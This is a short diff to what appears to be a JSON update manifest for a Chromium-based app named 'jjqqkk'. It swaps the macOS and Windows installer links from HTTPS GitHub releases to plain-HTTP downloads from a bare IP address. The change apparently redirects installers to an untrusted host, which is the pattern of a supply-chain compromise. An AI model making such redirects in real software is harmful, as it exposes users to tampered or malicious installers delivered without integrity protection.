@@ -12,7 +12,7 @@
     "darwin": {
         "jjqqkk": {
             "version": 1,
-            "installer": "https://github.com/jjqqkk/chromium/releases/download/75.0.3770.15/JJQQKK-1.0.0.pkg"
+            "installer": "http://167.99.163.129/JJQQKK-1.0.0.pkg"
         },
         "chromium": {
             "version": "76.0.3783.0",
@@ -22,7 +22,7 @@
     "windows": {
         "jjqqkk": {
             "version": 1,
-            "installer": "https://github.com/jjqqkk/chromium/releases/download/75.0.3770.15/JJQQKK-1.0.0.msi"
+            "installer": "http://167.99.163.129/JJQQKK.msi"
         },
         "chromium": {
             "version": "76.0.3783.0",
